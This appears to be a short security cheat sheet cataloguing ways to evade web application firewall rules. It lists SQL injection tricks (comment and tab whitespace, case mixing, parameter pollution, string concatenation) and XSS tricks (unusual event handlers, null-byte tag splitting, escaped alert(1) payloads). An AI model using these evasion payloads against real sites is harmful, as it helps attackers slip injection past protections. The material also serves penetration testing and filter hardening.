# Obfuscation Patterns

A catalog of string manipulation and encoding tricks to bypass standard WAF regular expressions.

## SQL Injection

### Whitespace Alternatives
When standard spaces (` `) are blocked:
- `+` (URL encoding default)
- `/**/` (Inline comments)
- `%09` (Tab), `%0a`, `%0b`, `%0c`, `%0d`, `%a0`

### Case Modification
- Mixing upper and lower case: `SeLeCt`, `uNiOn` (Bypasses case-sensitive rules).

### Parameter Pollution (HPP)
Exploiting how backend processes arrays vs the WAF.
PHP uses the last value: `?id=1&id=UNION SELECT...`
ASP.NET concatenates: `?id=1;UNION&id=SELECT...`

### String Concatenation 
- PostgreSQL & Oracle: `'se' || 'lect'`
- SQL Server: `'se' + 'lect'`
- MySQL: `'se' 'lect'`

## Cross-Site Scripting (XSS)

### Event Handler Tricks
Bypassing blacklist rules on `onload` or `onerror`.
- `onpointerenter`, `onpointerleave`, `onwheel`, `oncopy`

### Null Byte Injection
- `<scri%00pt>alert(1)</script>` (Premature processing termination in C-based systems).

### JavaScript Escaping
- Unicode Escaping: `\u0061lert(1)` -> `alert(1)`
- Hex Escaping: `\x61lert(1)` -> `alert(1)`
- Octal Escaping: `\141lert(1)` -> `alert(1)`
